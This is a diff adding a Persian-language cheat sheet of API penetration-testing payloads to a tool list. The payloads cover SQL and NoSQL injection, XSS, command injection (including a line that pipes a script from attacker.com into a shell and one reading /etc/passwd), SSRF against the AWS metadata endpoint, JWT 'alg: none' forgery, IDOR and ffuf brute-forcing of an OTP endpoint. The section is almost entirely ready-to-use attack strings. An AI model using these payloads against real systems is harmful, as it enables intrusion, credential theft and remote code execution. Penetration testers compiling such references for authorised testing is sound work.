@@ -51,3 +51,81 @@ Burp Suite / OWASP ZAP (برای رهگیری و تزریق)
 ffuf / wfuzz (برای brute-force روی پارامترها و endpointها)
 
 nuclei (برای اسکن خودکار API)
+
+
+======================================================================
+
+
+نمونه پیلودها برای تست نفوذ API
+1. SQL Injection
+
+```
+' OR 1=1 --
+" OR "1"="1
+1') UNION SELECT null,null,null--
+```
+نمونه تست در پارامتر:
+
+```
+POST /api/user
+{"id": "' OR 1=1 --"}
+```
+
+2. NoSQL Injection (MongoDB)
+
+```
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+```
+
+4. XSS (برای APIهایی که خروجی HTML دارند)
+
+```
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+```
+
+4. Command Injection
+
+```
+; cat /etc/passwd
+&& ping -c 1 attacker.com
+| curl http://attacker.com/shell.sh | sh
+```
+
+5. SSRF
+
+```
+{"url": "http://127.0.0.1:8080/admin"}
+{"url": "file:///etc/passwd"}
+{"url": "http://169.254.169.254/latest/meta-data/"} // AWS metadata
+```
+
+6. JWT Manipulation
+حذف امضا یا تغییر الگوریتم:
+
+```
+{"alg": "none", "typ": "JWT"}
+```
+تغییر payload:
+
+```
+{"role": "admin"}
+```
+
+7. IDOR (Insecure Direct Object Reference)
+تغییر شناسه در URL یا Body:
+
+```
+GET /api/user/123
+GET /api/user/124   // باید داده کاربر دیگر نمایش داده نشود
+```
+
+8. Rate Limit Bypass
+ارسال تعداد زیادی درخواست پشت سر هم با:
+
+```
+ffuf -u https://target/api/send_otp -w phone_numbers.txt
+```
+
+=================================================================
